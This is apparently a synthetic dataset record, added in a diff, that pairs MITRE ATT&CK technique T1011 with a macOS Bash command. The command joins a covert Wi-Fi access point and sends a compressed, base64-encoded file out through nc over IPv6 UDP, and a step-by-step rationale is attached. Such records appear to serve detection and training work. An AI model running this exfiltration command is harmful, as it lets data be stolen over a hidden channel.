@@ -1,0 +1,23 @@
+{
+  "technique_id": "T1011",
+  "platform": "macOS",
+  "shell": "Bash",
+  "command": "sudo /System/Library/PrivateFrameworks/Apple80211.framework/Resources/airport -z && networksetup -setairportnetwork en0 \"plant-165-ap\" \"P1@nt165\" && gzip -c /Users/Shared/exports/notes.txt | base64 | nc -6u fe80::b10c:0ffe:ca7e:f00d%en0 53371 -w 2",
+  "explanation": "Compresses and base64-encodes a text file and exfiltrates it via IPv6 UDP over a covert Wi\u2011Fi SSID on an uncommon port. This ensures use of an alternate wireless medium consistent with T1011.",
+  "rationale_steps": [
+    "Disassociate from any Wi\u2011Fi in use.",
+    "Join a covert AP on a high 5 GHz channel.",
+    "Compress and encode the file to make contents less readable in transit.",
+    "Transmit via IPv6 UDP on a high port bound to the Wi\u2011Fi interface."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1011-0b4a25ae-6b999b55",
+  "source_prompt_hash": "0b4a25ae",
+  "timestamp_utc": "2025-09-30T08:33:07.947625Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judge": null,
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
